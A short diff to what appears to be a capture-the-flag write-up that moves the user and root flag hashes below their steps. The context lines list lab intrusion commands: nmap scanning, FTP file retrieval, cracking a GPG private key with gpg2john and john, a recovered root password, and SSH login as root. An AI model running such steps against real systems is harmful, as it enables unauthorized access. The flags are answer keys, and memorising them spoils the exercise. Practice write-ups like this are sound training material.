@@ -9,19 +9,15 @@
 
 Read user.txt and root.txt
 ### User.txt
-```
-606083fd33beb1284fc51f411a706af8
-```
 * ```nmap -sC -sV <IP>```
 * ```ftp <IP>```
 * ```cd home/melodias```
 * ```get user.txt```
 * ```cat user.txt```
-
+```
+606083fd33beb1284fc51f411a706af8
+```
 ### Root.txt
-```
-f706456440c7af4187810c31c6cebdce
-```
 * ```ls /notread```
 * ```gpg --import private.asc```
 * ```/data/src/john/run/gpg2john private.asc > pgp.hash```
@@ -33,3 +29,6 @@ f706456440c7af4187810c31c6cebdce
 * ```root: hikari```
 * ```ssh root@<IP>```
 * ```cat root.txt```
+```
+f706456440c7af4187810c31c6cebdce
+```
